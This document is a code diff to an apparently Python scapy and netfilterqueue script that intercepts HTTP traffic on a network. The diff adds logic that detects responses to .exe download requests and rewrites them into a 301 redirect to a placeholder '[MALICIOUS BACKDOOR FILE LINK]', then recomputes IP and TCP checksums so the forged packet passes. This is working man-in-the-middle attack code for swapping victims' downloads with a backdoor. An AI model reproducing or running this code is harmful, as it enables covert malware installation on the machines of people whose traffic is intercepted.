@@ -10,12 +10,17 @@ def mod_packet(packet):
             if ".exe" in use_packet[scapy.Raw].load:
                 print("[+] Detected Download .exe file REQUEST...")
                 req_ack.append(use_packet[scapy.TCP].ack)
-                print(use_packet.show())
         elif use_packet[scapy.TCP].sport == 80:
             if use_packet[scapy.TCP].seq in req_ack:
                 print("[+] HTTP Response for the Download Req...#########")
-                print(use_packet.show())
                 req_ack.remove(use_packet[scapy.TCP].seq)
+
+                print("[+] Replacing Download with backdoor...")
+                use_packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: [MALICIOUS BACKDOOR FILE LINK]\n\n\n"
+                del use_packet[scapy.IP].len
+                del use_packet[scapy.IP].chksum
+                del use_packet[scapy.TCP].chksum
+                packet.set_payload(str(use_packet))
     packet.accept()
 
 queue = netq.NetfilterQueue()
